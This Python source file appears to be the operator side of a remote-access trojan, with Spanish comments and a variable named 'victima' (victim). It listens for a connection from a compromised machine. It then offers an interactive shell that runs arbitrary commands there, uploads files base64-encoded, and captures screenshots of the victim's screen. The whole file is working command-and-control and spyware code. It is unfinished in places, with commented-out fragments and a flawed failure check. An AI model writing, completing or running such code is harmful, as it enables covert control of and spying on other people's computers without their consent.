import socket
import base64

def upserver():
    global server
    global ip
    global victima

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    server.bind(('localhost',9180))
    server.listen(10)

    print("Servidor en marcha esperando conexiones...")

    victima, ip=server.accept()
    print("conexion recibida de : "+ str(ip[0]))
    shell()



def shell():    
        """ victima, direction=server.accept()
        print ('conecction de: {} '.format(direction)) """
        """ msjBinario=victima.recv(1024)
        msjCodifi=msjBinario.decode('utf8') """
        #current_dir=victima.recv(1024)
        #if msjCodifi=="1":
        count=0
        while True:
                #opcion=input("Enter".format(current_dir))                       
                opcion=input("shell@shell: ")            
                if opcion=="exit":
                    print("entre a exti")
                    victima.send(str.encode(opcion))
                    """ resultado=victima.recv(2048)
                    print (resultado) """
                    victima.close()
                    server.close()
                   
                    break
                elif(opcion[:2]=="cd"):
                    print(opcion[3:])
                    victima.send(str.encode(opcion))
                    resultado=victima.recv(2048)
                    print (resultado)
                elif(opcion[:6]=="upload"):
                    try:
                        victima.send(str.encode(opcion))
                        with open(opcion[7:],"rb")as file_upload:
                            victima.send(base64.b64encode(file_upload.read()))
                    except:
                        print("error en la subida")
                
                elif(opcion[:10]=="screenshot"):
                    victima.send(str.encode(opcion))
                    with open("monitor-{}.png".format(count),"wb")as screen:
                        datos=victima.recv(10000000)
                        data_decode=base64.b64decode(datos)
                        if data_decode=="fail":
                            print("no se pudo tomar la captura de pantalla")
                        else:
                            screen.write(data_decode)
                            print("Captura realizada")
                            count=count+1
                            print(count)
                else:
                    print ("el opcion es :", str.encode(opcion))
                    victima.send(opcion.encode("utf8"))
                    resultado=victima.recv(2048)
                    res=resultado.decode("ISO-8859-1")                    
                    print(res)        
upserver() 
